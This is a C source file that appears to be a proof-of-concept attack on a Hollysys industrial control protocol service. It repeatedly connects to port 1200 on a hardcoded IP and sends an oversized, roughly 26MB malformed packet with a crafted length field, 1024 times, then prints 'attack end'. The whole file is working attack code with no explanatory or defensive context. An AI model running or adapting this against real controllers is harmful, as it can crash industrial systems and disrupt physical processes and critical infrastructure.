#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")

#pragma pack(1)
typedef struct {
	unsigned short hdr;
	unsigned int len;
	unsigned short unused;
	unsigned char data[0];
}HOLLYSYS_PROTOCOL;
#pragma pack()

void mainproc(char * ip) {

	int ret = 0;

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		return;
	}

	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(ip);
	sa.sin_port = ntohs(1200);
	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret)
	{
		closesocket(s);
		return;
	}

	int totalsize = 0x1900000+0x10000;
	char * data = new char[totalsize];
	if (data == 0)
	{
		closesocket(s);
		return;
	}
	memset(data, 0, totalsize);
	HOLLYSYS_PROTOCOL * pro = (HOLLYSYS_PROTOCOL*)data;
	pro->len = totalsize - sizeof(HOLLYSYS_PROTOCOL)-4;
	pro->hdr = 0xbbbb;
	*(DWORD*)(data + totalsize - 4) = 0x12345678;
	ret = send(s, data, totalsize, 0);
	closesocket(s);
	delete data;
	if (ret != totalsize)
	{
		return;
	}
	return;
}

int main(int argc, char ** argv) {
	int ret = 0;

	WSADATA wsa = { 0 };
	ret = WSAStartup(0x0202, &wsa);
	if (ret)
	{
		return 0;
	}

	for (int i = 0; i < 1024; i++)
	{
		mainproc("128.0.0.250");	//49515
		Sleep(1000);
	}

	WSACleanup();

	printf("attack end\r\n");
	ExitProcess(0);
	return 0;
}